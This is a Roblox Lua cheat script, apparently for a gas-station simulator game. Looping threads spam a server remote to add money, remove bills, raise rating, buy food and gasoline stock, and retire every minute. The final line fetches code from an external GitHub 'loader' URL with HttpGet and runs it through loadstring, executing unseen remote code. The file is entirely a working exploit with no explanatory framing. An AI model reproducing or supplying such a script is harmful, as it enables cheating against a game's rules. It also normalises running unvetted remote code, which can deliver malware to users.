task.spawn(function()
    while true do
        local args = {
            [1] = "SandboxOption",
            [2] = "AddMoney"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "SandboxOption",
            [2] = "RemoveBills"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "SandboxOption",
            [2] = "AddRating"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        task.wait(1)
    end
end)

task.spawn(function()
    while true do
        local args = {
            [1] = "BuyItem",
            [2] = "Generic Foods",
            [3] = "Snacks",
            [4] = "Bubble Gum",
            [5] = "Station",
            [6] = 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "BuyItem",
            [2] = "Generic Foods",
            [3] = "Snacks",
            [4] = "Candy Bar",
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "BuyItem",
            [2] = "Generic Foods",
            [3] = "Snacks",
            [4] = "Generic Cookies",
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "BuyItem",
            [2] = "Generic Foods",
            [3] = "Food",
            [4] = "Bread Bun",
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "BuyItem",
            [2] = "Generic Foods",
            [3] = "Food",
            [4] = "Donut",
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        task.wait(2)
    end
end)

task.spawn(function()
    while true do
        local args = {
            [1] = "BuyItem",
            [2] = "Syntin Petrol Co",
            [3] = "Gasoline 90",
            [4] = 7,
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        args = {
            [1] = "BuyItem",
            [2] = "Syntin Petrol Co",
            [3] = "Gasoline 87",
            [4] = 7,
            [5] = "Station",
            [6] = 5
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))

        task.wait(5)
    end
end)

task.spawn(function()
    while true do
        local args = {
            [1] = "Retire"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):FireServer(unpack(args))
        task.wait(60)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/6Hubbed/loader/refs/heads/main/key"))()
